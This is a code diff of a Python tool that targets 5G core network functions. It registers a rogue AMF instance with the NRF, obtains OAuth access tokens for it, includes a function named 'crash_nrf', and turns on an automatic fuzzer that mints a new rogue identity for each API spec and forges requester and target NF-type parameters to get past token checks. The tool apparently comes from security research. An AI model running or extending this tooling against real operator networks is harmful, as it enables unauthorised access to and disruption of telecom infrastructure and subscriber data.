@@ -2,6 +2,7 @@ import requests
 import json
 import string 
 import random
+import re
 
 from src import *
 
@@ -25,17 +26,18 @@ def request_cn(nf,data,method,uri,headers={},token="",display=True):
     with httpx.Client(http1=False,http2=True, verify=False) as client:
 
         if method == "POST":
-            response = client.request(method, url, data=data, headers=headers)
+            response = client.request(method, url, data=data, headers=base_headers)
         else :
-            response = client.request(method, url, json=data, headers=headers)
+            response = client.request(method, url, json=data, headers=base_headers)
 
     try    : result = response.json()
     except : result = response.text
 
     # Afficher la réponse
     if display : 
-        print("-----")
-        print(f"Requête {method} {url}")
+        print(f"Request {method} {url}")
+        if headers : print(f"-> Headers : {headers}")
+        if data    : print(f"-> Body : {data}")
         print(f"-> Status Code {response.status_code}")
         print(result)
 
@@ -46,7 +48,7 @@ def ping_nf(nf):
     return request_cn(nf, {}, "GET","")
 
 # OK
-def add_nf(nf_instance_id, nf_type):
+def add_nf(nf_instance_id, nf_type, display=True):
     data = {
         "nfInstanceId": nf_instance_id,
         "nfType": nf_type,
@@ -54,11 +56,12 @@ def add_nf(nf_instance_id, nf_type):
     }
     return request_cn(
         "NRF", data, "PUT",
-        f"/nnrf-nfm/v1/nf-instances/{nf_instance_id}"
+        f"/nnrf-nfm/v1/nf-instances/{nf_instance_id}",
+        display=display
     )
 
 # OK
-def get_token(nf_instance_id, nf_type, scope, target_type):
+def get_token(nf_instance_id, nf_type, scope, target_type, display=True):
     data = {
         "grant_type": "client_credentials",
         "nfInstanceId": nf_instance_id,
@@ -66,15 +69,13 @@ def get_token(nf_instance_id, nf_type, scope, target_type):
         "scope": scope,
         "targetNfType" : target_type
     }
-    status, token = request_cn("NRF", data, "POST", f"/oauth2/token")
+    status, token = request_cn("NRF", data, "POST", f"/oauth2/token", display=display)
     return token["access_token"]
 
 # OK
-def setup_rogue(nf_instance_id=generate_variables("uuid"), nf_type = "AMF"):
-    add_nf(nf_instance_id, nf_type)
-    scope       = "nnrf-disc"
-    target_type = "NRF"
-    return get_token(nf_instance_id, nf_type, scope, target_type)
+def setup_rogue(nf_instance_id=generate_variables("uuid"), nf_type = "AMF", scope="nnrf-disc", target_type = "NRF"):
+    add_nf(nf_instance_id, nf_type, display=False)
+    return get_token(nf_instance_id, nf_type, scope, target_type, display=False)
 
 # OK 
 def get_nf_info(requester_nf_type, token, nf_type=None):
@@ -108,46 +109,77 @@ def crash_nrf(token):
     return get_nf_info("",token,"")
 
 # A TESTER
-def fuzz(token, nb_file=-1, nb_uri=-1, nb_ite=1, nb_method=1, nf_list=["UDM","NRF"], only_required=True):
+def fuzz(nb_file=-1, nb_uri=-1, nb_ite=1, nb_method=1, nf_list=["NRF","UDM","AMF"], only_required=True):
     '''
         Check the documentation of a nf_list and send random requests with random (but accurate type) parameters
     '''
 
+    # For each NF
     random.shuffle(nf_list)
     for nf in nf_list:
         nf_file_name = "N" + nf.lower()
         files = [f for f in os.listdir(SOURCE_FOLDER) if nf_file_name in f]
         random.shuffle(files)
 
+        # For each file
         for file in files[:nb_file] : 
             file_path = f"{SOURCE_FOLDER}/{file}"
 
+            # Read the file
             with open(file_path, 'r', encoding='utf-8') as f:
                 yaml_content = yaml.safe_load(f)
-                paths = yaml_content["paths"]
-                uris  = list(paths.keys())
-                random.shuffle(uris)
 
-                for uri in uris[:nb_uri]:
-                    methods = list(paths[uri].keys())
-                    random.shuffle(methods)
+            print("==========")
+            print(file_path)
 
-                    for method in methods[:nb_method]:
+            # Need to create a new instance with a proper token
+            try : scope = yaml_content["servers"][0]["url"].split("/")[1]
+            except : scope = "nnrf-disc"
+            nf_instance_id = generate_variables("uuid")
+            token = setup_rogue(nf_instance_id,scope=scope,target_type=nf)
+            print(f"Creating {nf} {nf_instance_id} with scope {scope}...")
 
-                        header = {}
-                        body   = {}
+            # Loop through URIS
+            paths = yaml_content["paths"]
+            uris  = list(paths.keys())
+            random.shuffle(uris)
+            for uri in uris[:nb_uri]:
+                methods = list(paths[uri].keys())
+                random.shuffle(methods)
 
-                        if 'parameters' in paths[uri][method] :
-                            parameters = paths[uri][method]['parameters']
-                            new_uri, header = extract_parameters(parameters, uri, file, only_required)
+                for method in methods[:nb_method]:
 
-                        if 'requestBody' in paths[uri][method]:
-                            body = paths[uri][method]['requestBody']['content']
-                            accept, body = extract_body(body, file, only_required)
+                    header = {}
+                    body   = {}
 
-                        for _ in range(nb_ite):
-                            print(f"{nf} {method} : {new_uri} (header : {header}, body : {body})")
+                    if 'parameters' in paths[uri][method] :
+                        parameters = paths[uri][method]['parameters']
+                        new_uri, header = extract_parameters(parameters, uri, file, only_required)
+
+                    if 'requestBody' in paths[uri][method]:
+                        body = paths[uri][method]['requestBody']['content']
+                        accept, body = extract_body(body, file, only_required)
+
+
+                    # If its a file that use the '{apiRoot}/nnrf-nfm/v1' prefix we use it
+                    try : 
+                        pre_uri = yaml_content["servers"][0]["url"].replace("{apiRoot}","")
+                        new_uri = pre_uri + new_uri
+                    except : 
+                        pass
+
+                    # When receiving some NF check if the requester/sender NF is the same as the one in the token
+                    # So we force the value if it's present in the uri
+                    new_uri = re.sub('target-nf-type=(.+?)(&|$)', f'target-nf-type={nf}&', new_uri)
+                    new_uri = re.sub('requester-nf-type=(.+?)(&|$)', f'requester-nf-type=AMF&', new_uri)
+
+                    for _ in range(nb_ite):
+                        # print(f"{nf} {method} : {new_uri} (header : {header}, body : {body})")
+                        print("---------")
+                        try : 
                             request_cn(nf,body,method,new_uri,header,token=token)
+                        except Exception as e:
+                            print(f"Error sending the request: {e}")
 
 # ---------
 
@@ -163,7 +195,7 @@ def fuzz(token, nb_file=-1, nb_uri=-1, nb_ite=1, nb_method=1, nf_list=["UDM","NR
 # crash_nrf(token)
 # random_dump(token)
 
-# fuzz(token)
+fuzz()
 
 # get_user_data(supi, token)
 
